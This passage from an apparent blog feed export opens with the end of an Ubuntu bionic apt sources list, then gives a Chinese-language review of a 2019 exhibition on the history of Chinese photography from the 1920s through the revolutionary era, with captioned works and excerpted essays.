class="line">deb http://cn.archive.ubuntu.com/ubuntu/ bionic-updates multiverse</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://cn.archive.ubuntu.com/ubuntu/ bionic-updates multiverse</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># N.B. software from this repository may not have been tested as</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># extensively as that contained in the main release, although it includes</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># newer versions of some applications which may provide useful features.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Also, please note that software in backports WILL NOT receive any review</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># or updates from the Ubuntu security team.</span></span></span><br><span class="line">deb http://cn.archive.ubuntu.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://cn.archive.ubuntu.com/ubuntu/ bionic-backports main restricted universe multiverse</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Uncomment the following two lines to add software from Canonical&#x27;s</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># &#x27;partner&#x27; repository.</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># This software is not part of Ubuntu, but is offered by Canonical and the</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># respective vendors as a service to Ubuntu users.</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb http://archive.canonical.com/ubuntu bionic partner</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://archive.canonical.com/ubuntu bionic partner</span></span><br><span class="line"></span><br><span class="line">deb http://security.ubuntu.com/ubuntu bionic-security main restricted</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://security.ubuntu.com/ubuntu bionic-security main restricted</span></span><br><span class="line">deb http://security.ubuntu.com/ubuntu bionic-security universe</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://security.ubuntu.com/ubuntu bionic-security universe</span></span><br><span class="line">deb http://security.ubuntu.com/ubuntu bionic-security multiverse</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">deb-src http://security.ubuntu.com/ubuntu bionic-security multiverse</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>technology</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>摄影术传入至今的中国摄影书写1</title>
    <url>/photography/2019/07/%E6%91%84%E5%BD%B1%E6%9C%AF%E4%BC%A0%E5%85%A5%E8%87%B3%E4%BB%8A%E7%9A%84%E4%B8%AD%E5%9B%BD%E6%91%84%E5%BD%B1%E4%B9%A6%E5%86%991/</url>
    <content><![CDATA[<p>2019-04-14 去看了由中国美术学院美术馆举办的摄影展 ——「摄影术传入至今的中国摄影书写」。断断续续花了 3 个月时间整理了看到的相关照片及文字，全篇共 36267 字，216 张照片，描绘了摄影在中国的发展脉络，展现了不同时期的摄影表现手法、内涵和意义，再现了爸妈、爷奶辈儿时期的往事旧景。同时深刻的文字评论或许能为在这个人手一台摄影机器的年代中喜爱摄影的人们提供别具一格的创作灵感。</p>
<p>该展览为纪念中华人民共和国成立 70 周年，展出逾 600 件珍贵摄影作品，不仅是对于革命与复兴的历史性回望，还将围绕摄影师的人生历程和艺术创作的视角展开。展厅既向观众呈现了作为若干历史时刻的 1949 年，也试图讨论新中国时期摄影机制的生成。</p>
<p>新中国图像的制造者，因处在当年不署名或集体署名的特定历史情况中，有时会成为谜团。然而，他们中有些人在民国的摄影活动中享有声誉；另一些从战争年代开始从事摄影，间接性地接受了民国摄影的视觉经验，还在战时摄影实践中增进了对摄影的理解与应用，成为新中国成立后为数不多的官方摄影师。</p>
<p>展览按照不同的摄影题材分为多个主题，包括「文人、画意、都市与现代」、「文人与史诗」、「中国革命的视觉档案」、「1949：一个时刻和新中国摄影机制的生成」、「佚名照：二十世纪下半叶中国人的日常生活图像」、「早期中国影像原作展」、「中国当代摄影书作品：纸上的视觉叙事及其他」等。</p>
<p><strong>文人与史诗</strong></p>
<ul>
<li>「文人、画意、都市与现代」</li>
<li>「奔向战场：从边区到新中国」</li>
</ul>
<p><strong>文人、画意、都市与现代</strong></p>
<p><strong>节选自《从东到西：中国艺术摄影启蒙时期》</strong></p>
<p>文 &#x2F; 陈申 徐希景</p>
<p>摄影术自 19 世纪 40 年代传入中国至 “五四” 运动时期已历七十多年的发展，但是，在 “学而优则仕” 的传统 “士大夫” 门第观念影响下，摄影一直被视为民间 “匠艺“，是有钱有闲的 “纨绔子弟” 的消遣娱乐，难登正统艺术的殿堂。再加上连年的列强侵略、军阀割据、战祸连连,中国社会长期处于民穷财尽、民生物资十分匮乏的时代，阻碍了中国摄影的正常发展，摄影沦为民间照相馆为 “生计” 的糊口职业。20 世纪二三十年代，是中国艺术摄影的启蒙时期。</p>
<p>20 世纪初，随着摄影技术的发展，小型相机在中国的大量行销，《实用映相学》《新编摄影术》等摄影普及读物的出现，以及摄影图片被越来越多的报刊所采用，摄影得到一定的推广普及，涌现出了一批业余摄影家。他们摆脱了早期摄影局限于照相行业的纯商业的色彩，拍摄的题材比前期有了较大的扩展，表现出比较丰富的社会内容，某些作品逐渐呈现出艺术的特性。特别是 “五四” 运动之后，经过 “新文化运动” 洗礼的一批文人学者、有识之士加入到摄影队伍中来，以他们广博的学识、深厚的艺术素养和探索精神，在摄影艺术处女地上披荆斩棘，辛勤耕耘，才有了源自西方的新兴的摄影艺术在中国这一时期的繁荣和发展。在摄影表现形式的探索上，虽然大多数作品仍然沿袭传统绘画造型概念，但是，随着作品内容逐渐广泛和主题的不断深化，确实也出现一些具有创新精神的作品，反映了这一时期摄影师审美趣味的变化。20 世纪二三十年代成为中国现代意义上摄影的转型期，一些文艺界人士的思想倾向和艺术倾向，使摄影从机械复制的时代走向艺术创造的时代，为中国现代摄影创作方向定下了基调和范例。</p>
<p>20 世纪二三十年代，是中国摄影艺术发展历史上第一个繁荣期，北京 “光社” 和上海的 “华社”（“中华摄影学社”）以及 “黑白社” 等文艺研究团体如雨后春笋般涌现出来。这里聚集着从事摄影创作和研究的高层知识分子，形成了影响深远的南北方摄影家艺术群体。这些摄影团体除举办展览外，还编辑出版了各种形式的摄影书刊，对摄影艺术和理论的研究也十分重视。此时，出版业也开始发展，一些职业或业余摄影者开始翻译、编译刊物。这一时期摄影艺术在中国出现了一片繁荣发展的景象，涌现出许多秉有传世作品而青史立传的摄影家，如陈万里、刘半农、郎静山、张印泉、潘达微、胡伯翔、舒新城、吴中行、蔡俊三、陈传霖等，他们的摄影创作对后来中国摄影艺术的发展影响深远。</p>
<p>所以，这一时期的中国摄影走过了一条与西方摄影在 19 世纪后半叶的画意摄影很接近的发展历程也就不难理解。民国初年特别是 “五四” 新文化运动以来，以东西方美术交融为特征的新美术运动虽然结束了近千年来文人画一统天下的局面，但是中国传统绘画，特别是以山水、松竹、花鸟为主要题材的文人画在画坛还有深远影响，因此，许多摄影家就借鉴水墨画的表现题材和创作手法，拍摄题材以山水花草虫鸟为主，画面构图和空白处理都具有水墨画的意韵，作品题目也富有诗意，甚至还有一些摄影家直接在照片上题词落款。摄影艺术拓荒者之一的陈万里收入《大风集》中的 12 幅作品都处理成写意的效果，画面追求诗情画意。刘半农的许多作品也是融诗书画印为一体，“他以诗人的独特敏感摄下了一枝孤独的依依垂柳，又加上富有诗意的题款，‘春风不管人间恨，又送青青到柳梢。’ 就使画面显得生机勃勃。朋友们都称赞：’半农的摄影作品是画中有诗，诗中有画。’ ”当时的《大众画报》还开辟 “诗之影” 专栏，集中刊登张印泉、吴印咸、冯四知等许多摄影家模拟古诗词意境的摄影作品，并以整首诗词作为标题或填入作品之中。再如，20 世纪 30 年代郎静山的集锦摄影模拟中国画的意境，直接运用中国画的散点透视，把不同地方的景物运用暗房叠放技术等合成在一个画面上，摄影手段仅仅用于收集素材而已，而创作思想理念完全是中国传统绘画，用摄影手段表达出传统绘画的精神诉求。这在他第一次个展时出版的专刊上就有明确阐述，自己的摄影 “所采构图理法，亦多与吾国绘事相同…… 今有集锦之法，画之境地，随心所欲，于大自然景物中仿古人传模移写之诣构图，制成理想中之意境” 在同一文中他还说，“由此观之，东方艺术，可为摄影之助，摄影亦足证东方艺术，它早入于精妙之域也。”就在当时的中国摄影家借鉴中国传统绘画的表现题材和创作手法的同时，与之形成鲜明对比的一种有意味的现象是：民国时期文化界、美术界倡导的美术革命却在提倡学习西方油画的写实手法，文人画的价值观念被当时思想文化界具有相当感召力的改良派和革命派的领导人物所痛击。中国的知识精英（从康有为、梁启超到陈独秀等）在 “重形似” 的西方传统绘画的对照中，发现了传统绘画只尚 “写意” 不求写实的弊端。所以都把西洋画 “写形” 之特征看作是与中国画最大的区别，在呼唤 “民主” 与 “科学” 的 “五四” 新文化运动中，西方的写实绘画更是被看成是科学、进步的美术观和形态，而得到大力的倡扬。康有为在他的《万木草堂藏画目》序中，提倡以工笔写实见长的宋院画并主张仿效郎世宁，赞扬 “西画之精新妙肖至工”。梁启超在北京美术学校所做的《美术与科学》的讲演中，指出了西方的重商主义和写实的再现艺术实践内在的联系，提倡 “科学化的美术” 和 “美术化的科学”，表达了科学与艺术相结合的价值取向。陈独秀在《新青年》答吕微提出的问题时也提出采用西洋画写实的精神改良中国画的观点。而蔡元培则是民国初年新美术运动中引进西洋画和传播西方艺术思想的启蒙者和直接推动者，他所提出的 “以美育代宗教” 说和 “科学美术，同为新教育之要纲。” 整整影响了一代人。在 “新文化运动” 影响下，一批批走出故土的艺术学子大多数在日本、欧洲接受了学院写实主义绘画的训练，学成回国后,多以教学方式极力推行写实主义绘画，以至学院写实主义绘画成为当时影响最大，画坛主导地位的流派。</p>
<p>而以写实为本体特征的摄影却反其道而行之，文人学者介入摄影，他们对西方油画了解不多，但是，他们都有着传统文化底蕴，又不满足于早期照相馆的机械摹写，就如刘半农所说的，“想在照相中找出一些 ‘美’ 来”，于是，借鉴文人画的写意手法，运用摄影来创造 “中国画意” 的特有韵味。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm3m7a10CteLrfMSrHe289o5d4MvwUicCTic3C0C72Fy5GkGe6S2OhiaIsg/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>镜花</strong> </p>
<p>Flowers in the mirror</p>
<p>1927</p>
<p>郭学群</p>
<p>油渣 Bromoil Print</p>
<p>原作由陈申收藏</p>
<p> <img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmChVbdUBOvRoqiaCCd9E9ubqkicZPCkrMNDwTjrUAfRicHdBXN3WnG29CQ/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>黄山梦笔生花</strong> </p>
<p>Paintbrush in dreamland</p>
<p>1962</p>
<p>金石声</p>
<p>明胶银盐 Gelatin Silver Print</p>
<p>原作由金华收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmkjdZZhDsrrqaMtuaCibKwF2mcpW5odYL0Sic258I8gXsaIZPhPnABKiaw/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>利器</strong> </p>
<p>Sharp Objects</p>
<p>1927</p>
<p>吴郁周</p>
<p>树胶法 Gum Print</p>
<p>原作由陈申收藏</p>
<p><strong>奔向战场：从边区到新中国</strong></p>
<p><strong>节选自《摄影的制造与传播：从边区到新中国》</strong></p>
<p>文 &#x2F; 高初</p>
<p><strong>民族危亡之际的摄影转向</strong></p>
<p>在抗日战争爆发前一个星期，即 1937 年 6 月 24 日至 30 日，在北平曾举办过一次规模宏大的 “北平第一届摄影联合展览会”，许多当时的摄影名家如北京的张印泉、李黎轩、魏守忠、蒋汉澄、方大曾、魏南昌、上海的郎静山、刘旭沧，南京的叶浅予、高岭梅等都参加了这次展出，这些人当时大都还是为艺术而艺术或为兴趣而艺术的信奉者，他们展出的作品，其内容大都依然是风花雪月、名胜古迹等，和当时已经岌岌可危的北平形势并不很协调，但在展览会《致敬—参观诸君》中，也赫然写着：“有人生即有艺术，这是一种定律。可是它的趋势，常受着社会潮流推荡而变迁，摄影也不外此。我们当国难严重的关头，所需要新的艺术，当然是以发扬民族精神为前提。”</p>
<p>自 1930 年代以来，中国摄影呈现出更为多元的面貌。其一是摄影者的来源更为广泛：职员和学生成为摄影活动的新兴力量。其二是伴随这一时期都市视觉媒介和画报的兴盛，摄影逐渐职业化。其三摄影书籍和杂志的刊行，社团的活跃已经为摄影的技术层面的讨论作出铺垫，各个门类的艺术也慢慢成为摄影得以汲取的养料。其四是对于外国猎奇的反思，以及对于民族文化的视觉语言的探索。随着 1931 年的九一八事变和 1932 年的一二八事变，自 “美化生活、陶冶情操” 的风景、花树、鸟兽、静物等呈现审美情趣的题材而进入表现劳动者的现实性的题材，进而在 1937 年的七七事变前后转向战场，转向士兵。摄影的传达对象，从社团内部的雅集交游，到参观展览的市民，进而到能被鼓呼而投入到民族救亡的一切国民。</p>
<p>这一时期对于摄影的讨论，也是逐步推进的。1936 年冯四知写道：“仅只美啊，诗意画意的照片,不能算是摄影艺术，真正的艺术品，是能改变人的环境、生活、思想，有一种力的感动。” 1937 年 6 月出版的《飞鹰》杂志第 18 期明确地提出：“在目前，全中国到处可闻到大众不平的吼声，社会上任何角落里，可以看到大众为争取民族解放而汇流的斗争鲜血…… 因为现在中国最大的问题，人人所共的问题，是民族生存的问题，截取具有积极性的题材，固然可使一切不愿做奴隶的人们因此而奋起，反抗，战斗；但也暴露现实的丑恶为目标的取景,也同样可以因此引起被压迫者们的决心,挣扎,拼断所有加在他们头顶上的锁链。摄影研究者们跟着时代的进展，正需有新的开拓，但这开拓，决不是一二个人的能力所能达，要有前进的研究者的加倍努力；保守者们的移步向前。这，一方面，当然要从新的理论中去学习；一方面，当然也要由活的实践中去改进。</p>
<p>这一 “积极性” 的题材和摄影在观看后产生的效用，蕴含着中国的摄影在战争爆发、民族危亡的特定的历史情况下，摄影的意义系统从拍摄者转向到观看者，摄影的评价效果也在于对于观看者的情绪的触动和行动的激发。这一拍摄者和观看者的主客体的转换，意味着摄影的主体与观念、题材与语言、媒介与现场都发生了意味深长的置转和重组。“作为仪式的拍照” 和 “革命时期的宣讲式的观看” 成为自战争时期至新中国，乃至今天我们讨论中国摄影的两个核心概念。进而言之,这一在抗战前后所发展的对于摄影的观念层面的认识和实践层面的操作，不但成为了新华社、各大画报社等为代表的新中国时期摄影的基本形态，而且影响持续至今。1980 年代摄影思潮与摄影批判正是对于这一现象的回应，但背离性的姿态仍无法摆脱这一话语的范畴。这是艺术史上颇为独特的一种社会和文化形态，在中国 “摄影” 反而成为问题汇集的一个焦灼点，这正是因为摄影在战争时期和新中国时期在国家能力和文化建构功能的发挥的巨大作用。从中国摄影史的分期而言，1936 年所开始的摄影争论和摄影实践，成为了一个意味深长的起点。</p>
<p>这一时期的中国摄影，就其内部而言，发生着剧烈而迅速的变化。对于抗战时期的中国摄影的外部讨论也可以在两个结构里得到观察；其一是世界史的结构，其二是摄影史的结构。</p>
<p>对于世界史的结构而言，中国和日本都迫切地需要建立民众动员的政治视觉机制、和对于敌对者的说服的文化视觉机制。可以说，中国摄影史的重要摄影师和日本摄影史的重要摄影师，此刻相聚在中国的战场上，为各自的现代国家和现代民族的目标进行着视觉性的文化构造。图像的生产与传播，以及围绕图像语义的生产与传播，是这一事业的核心和途径。艺术家不但放弃了自身的主体性，投入到这一工作中，艺术家也正是在这一过程中生成了自身的主体性；建立视觉经验和审美情态、探索个人的风格。</p>
<p>对于摄影史的结构而言，战争时期和新中国时期的中国摄影史，是由摄影群体在战争时期和新中国时期的摄影生涯和个人的生命史构成他们对于摄影的 “效果论” 的理解，他们驾驭的题材，乃至他们所参与的民族解放和国家建立的情感上的撞击，逐渐地内化于他们的生命经验和艺术风格。而在他们的生涯的早期，对于摄影媒材和题材的现代主义探索也成为他们作品的重要底色。</p>
<p>东西方文化碰撞的巨大能量，从殖民地状态到建立新中国的精神气质，赋予了这一代摄影者在视觉性的实践探索和理论重建中的历史使命，以及具体的摄影题材和表现方式。摄影不但是这场剧变的记载媒介，而且是这场重建的组成部分。史诗叙事和革命动员逐渐成为他们生涯中被显现的情感结构和艺术状态。以现代主义为主线的艺术家的个人探索贯穿他们的生涯始终，但是往往隐藏在具体的革命题材中。</p>
<p>他们生涯的第一个特点是 “向下唤起”：而放弃艺术家的主体性，将个人的审美倾向替换为 “预设的观众” 的情感倾向。对于照片成功与否的评价，要看通过展览和画报出版的动员的效果。他们生涯的第二个特点是：“放弃制作作品”：如果说西方艺术史是将艺术家的艺术品作为写作的对象，作品是艺术家不断推进的艺术探索的生涯的坐标，是艺术界的流通品，也是艺术批评和艺术史写作的对象。但是这些摄影师的作品一般只蕴含在 “观看” 的现场。他们的真正的作品不在于展出之后留下来的相纸，而在于观者在这一现场 “心里燃起一股热力”，这些无形的，在革命构造中产生的动能，才是在历史语境中他们的生涯的真正评价。</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm7GCB0ZiacvW51GQKiaQXsRqAm6WGpaaZ36WGGUPyfsuQVwz2v7ibcrUWw/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1949 年 3 月 25 日，毛主席在西苑机场检阅部队</strong></p>
<p>Chairman Mao reviewed troops at Xiyuan airport on March 25, 1949</p>
<p>1949</p>
<p>高帆</p>
<p>明胶银盐 Gelatin Silver Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmZA4VQseqiasBoB0kBQqKhkqMvsibHzqugHBl7J45AI7j8K5xNR4JqsMw/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1949 年 3 月 25 日。毛泽东、朱德等乘车在西苑机场阅兵检阅高炮部队</strong></p>
<p>Mao Zedong, Zhu De and others paraded at Xiyuan Airport to review the anti-aircraft artillery troops on March 25, 1949</p>
<p>1949</p>
<p>高帆</p>
<p>明胶银盐 Gelatin Silver Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmp8wTIHN8Jh4kJFM4U7CnH5fNTI4fnTTFSEzX14hcGND0pWMKeg5xow/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1948 年，临汾战役中，我军爆破手对敌实施大爆破</strong></p>
<p>Our army’s blasters carried out large-scale blasting against enemy in the battle of Linfen in 1948</p>
<p>1948</p>
<p>高帆</p>
<p>明胶银盐 Gelatin Silver Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmYGDNkjsVzhlXuPNzs9Pib8sFg21o8818JK0cCl1qwTGeb7zjyU8tz6w/640?wx_fmt=jpeg" alt="img"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmOTVdJibmZOOlumCMd15YHvwwhoISlTvvlICtyGv4dxkabxLsnLIsAqQ/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1946 年 9 月，定陶战役大杨湖战斗中，我军防空哨兵，山东</strong></p>
<p>September 1946，Chinese ari defense sentry at Dayanghu Battle，Dingtao Campaign，Shandong</p>
<p>1946</p>
<p>高帆</p>
<p>明胶银盐 Gelatin Silver Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmArDm2E2bs6CicaNQVL1rnFDNg1koWsJAWYwTDic1CJcicLDRGr1bibdxzA/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>1942 年，太行山区涉县人民送郎参军</strong></p>
<p>In 1942，woman of She County，Taihang Mountain Area，sent their husbands to join the army</p>
<p>1942</p>
<p>高帆</p>
<p>明胶银盐 Gelatin Silver Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm4x1Bakczyh3tMUVJPrrZzRleEOib0MFfQVIG2vJ1pPq36iabALIbphSQ/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>出席太行山群英会的女劳模孟祥英同志，此幅作品制作与展览于 1987 年的太行山大别山喜马拉雅山（三山）展览，作品信息沿用当时展签说明。</strong></p>
<p>Comrade Meng Xiangying, a female model worker attending the Taihang Qunying Meeting. This work was produced and exhibited at the Taihang Dabie Himalayas（Three Mountains）Exhibition 1987. The information of the works followed the instructions of the exhibition signs at the time.</p>
<p>1987</p>
<p>明胶银盐 Gelatin Silver Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxm5aQb1abEl24WiaBeNVl9Fiby6pHrmdlphljRJ78WM3XedWILKhibzpSzg/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>朱德总司令、彭德怀总司令在山西省武乡县王家峪。此幅作品制作与展览于 1987 年的太行山大别山喜马拉雅山（三山）展览，作品信息沿用当时展签说明。</strong></p>
<p>Commander Zhu De and Commander Peng Dehuai were in Wangjiayu, Wuxiang County, Shanxi Province. This work was produced and exhibited at the Taihang Dabie Himalayas（Three Mountains）Exhibition 1987. The information of the works followed the instructions of the exhibition signs at the time.</p>
<p>1987</p>
<p>明胶银盐 Gelatin Silver Print</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmMRGLsOMpicThnHoWMHHMwtMx2ttzjo1oIibUzjQIRUG28Ga8xYyvmAoQ/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>我军向祁县开进，此幅作品制作与展览于 1987 年的太行山大别山喜马拉雅山（三山）展览，作品信息沿用当时展签说明。</strong></p>
<p>Our army marched towards Qixian. This work was produced and exhibited at the Taihang Dabie Himalayas（Three Mountains）Exhibition 1987. The information of the works followed the instructions of the exhibition signs at the time.</p>
<p>1987</p>
<p>明胶银盐 Gelatin Silver Print</p>
<p><strong>战事</strong></p>
<p><strong>The Battlefield</strong></p>
<p>“延安没有电灯，一切摄影工作都要靠自然光。…… 当时我们既没有放大机，也没有放大纸。…… 我们在屋顶上开了一个小小的天窗 …… 放大机就这样形成了。…… 解决放大纸的唯一方法，就是用印相纸来代替。那时所用的 ‘爱素’ 印相纸是一种感光较慢的材料，放大一张照片的曝光时间至少要10分钟，有的甚至长到一个小时以上。最困难的是具体掌握每一张底片的曝光时间。由于自然光变化很多，曝光时间又长久，很难准确。为了解决这个问题，不得不分配一位同志在暗房外面专管观察光线的变化。” “我们（自 1941 至 1946 年在延安的摄影工作）所用的胶片和印相纸有两个来源，一个是 1938 年我们到延安时带去的一批 …… 另一个来源是依靠前线，经过战斗从敌人手里缴获的战利品。这些感光材料不是过期很久，就是在长期行军中受到强烈的日光照射，或多或少变了质的。” “在晋察冀根据地的摄影工作者，曾经创造性地作出一种流动型的冲洗放大暗房。…… 随时有转移的可能，不可能有固定的暗房。这种流动暗房是用多层黑布缝制的，只要用几根竹竿把它支撑起来，或用绳索把它吊起，就可以在里面冲洗放大。没有冲洗胶卷用的红灯，他们就点一支香来代替，不仅与红灯起了同样的作用，在夏季还可以驱除蚊蝇。刚冲过胶卷就要行军，他们就把胶卷挂在竹竿上，等到达目的地，胶卷也就干了。至于显影盘、定影盘，也常用老乡们吃饭的大瓷碗代替。”</p>
<p>—— 吴印咸《回忆抗战时期的摄影工作》，刊于《中国摄影》（1957 年第三期）</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmw17knDPRNkJQfvIzyTmWicKJXaFw1CNVgMTmQ0Y2DzKwjy1Ve683ryg/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>可口可乐</strong></p>
<p>Coca-cola</p>
<p>1939</p>
<p>金石声</p>
<p>明胶银盐 Gelatin Silver Print</p>
<p>原作由金华收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmlWfJT994RI7QJDXI2qMwldKzbRI7uh9oAHjfh2O6xIsdtpRQumqSLw/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>自拍像</strong></p>
<p>Self Portrait</p>
<p>1937</p>
<p>金石声</p>
<p>明胶银盐 Gelatin Silver Print</p>
<p>原作由金华收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmIV3ZeNQ91wfyVuJhBPj67T8fhC9YcOtC9oaDhP5rZwJfiaEs1OLr8AQ/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>金石声携第一架相机——柯达 3A 与扬州影楼摄影师切磋</strong></p>
<p>Holding his first camera, a Kadak 3A, Jin Shisheng learns from a portrait studio photographer in Yangzhou.</p>
<p>1926</p>
<p>金石声</p>
<p>明胶银盐 Gelatin Silver Print</p>
<p>原作由金华收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmSIwXXhkypBnvC3b0kOAoJSjCrVh5MafaicTZlJq1FLlL1u7icmic6zFaA/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>构图</strong></p>
<p>Composition</p>
<p>1933</p>
<p>骆伯年</p>
<p>明胶银盐 Gelatin Silver Print</p>
<p>原作由金华收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPliaVtFrXic1qMOXhYy0Pa5GXb3k8IJLhN7CYibbe6Baiazymic1yYNY3V7ibBCuggaCUAMjq1qiaZA6dZ0QQ/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>西湖边</strong></p>
<p>Along the West Lake</p>
<p>1930 - 1940s</p>
<p>骆伯年</p>
<p>明胶银盐 Gelatin Silver Print</p>
<p>原作由金华收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmzowHLE1TDGCWttwkdDatyVA7jzcaLsnmzMJYkDg5k7UtuOOib1yaiciaQ/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>伊索寓言</strong></p>
<p>Aesop’s Fables</p>
<p>1927</p>
<p>老焱若</p>
<p>明胶银盐 Gelatin Silver Print</p>
<p>原作由陈申收藏</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_jpg/VLpxmJ1QPljFqSpNvxSlTBzGsOw5QJxmB4Xh9PeU6dVCECsu4RbkRnpnX6jaP6Ul3m5xxaoPOpzaCiasIRkz9KA/640?wx_fmt=jpeg" alt="img"></p>
<p><strong>鹫峰晨曦</strong></p>
<p>Dawn of Vulture Peak</p>
<p>1920s</p>
<p>汪孟舒</p>
<p>明胶银盐 Gelatin Silver Print</p>
<p>原作由陈申收藏</p>
<p><strong>蔡元培对摄影艺术及其申美价值的肯定</strong></p>
<p>蔡元培是中国美学、美育的倡导者、开拓者。他原是清末翰林，对传统学术有精深理解，又先后四次留学德、法两国，对欧洲哲学、美学及世界文化史深有造诣，由于他学贯中西、博古通今，使得他的美育思想并不仅仅是西方思想的简单译介，而是联结传统与现代、中国与西方文化，成为民国初年新艺术运动的启蒙者和推动者，对中国的审美教育作出了卓著的贡献。在他的《美学的研究方法》、为商务印书馆出版的《教育大辞书》中所撰写的《美育》条目释文、《三十五年来中国之新文化》《二十五年来中国之美育》《与时代画报记者谈话》中都直接或间接提及摄影，从理论上肯定了摄影艺术的社会地位，把摄影作为实施美育的重要内容之一，在摄影艺术发展的初期，它的观点有力地支持了年轻的摄影艺术。</p>
<p>蔡元培在提倡和推行他的美育思想过程中，对年轻的摄影艺术予以极大的关注，特别是在他的两篇体现其美学教育思想的重要文献 —— 《三十五年来中国之文化》的美术部分和《二十五年来中国之美育》 中，都持摄影艺术与绘画艺术 “相等” 的观点。前文专论 35 年来中国美术 —— 艺术的发展脉络，包括美术学校、博物院与展览会、建筑术、摄影术、书画摹印、音乐、文学、演剧、影戏、留声机与无线电播音机、公园等11个章节。从中不难看出，蔡元培对艺术的分类受到了西方现代主义思想的影响，除了传统艺术之外，他把建立在现代科技基础之上的摄影、影戏（即电影）、留声机与无线电播音机等新兴的视听艺术，以及博物院与展览会、公园等公共艺术也纳入艺术行列，在艺术分类上体现出这位学贯中西的学者那 “兼容并包” 的多元化倾向和开明思想，与他的 “科学与美术同为新教育之要纲” 的精神一脉相承。在文章中，蔡元培肯定了摄影的艺术地位，并简述摄影艺术的发展：”摄影术本是一种应用的工艺，而一入美术家的手，选拔风景，调剂光影，与图画相等；欧洲此风渐盛，中国现亦有 “光杜” 、“华社” 等团体，为美术摄影家所组织。“光社” 设在北平，成立于十二年，初名 “艺术写真研究会”，十三年改名 “光社”。每年在中公园董事会开展览，观众在万人以上，十六年以来，已出年鉴两册。“华社” 设在上海，成立于十六年，曾开展览数次；印刷品有社员郎静山《摄影集》。上海又有天鹏艺术会，印有《天鹏》摄影杂志。”《二十五年来中国之美育》类似前文，文中分为造型艺术、音乐、文学、演剧、影戏、留声机与无线电播音机、公园七个部分，逐一详述。把摄影术和美术学校、博物院、展览会、美术品印本并列于 “造型艺术” 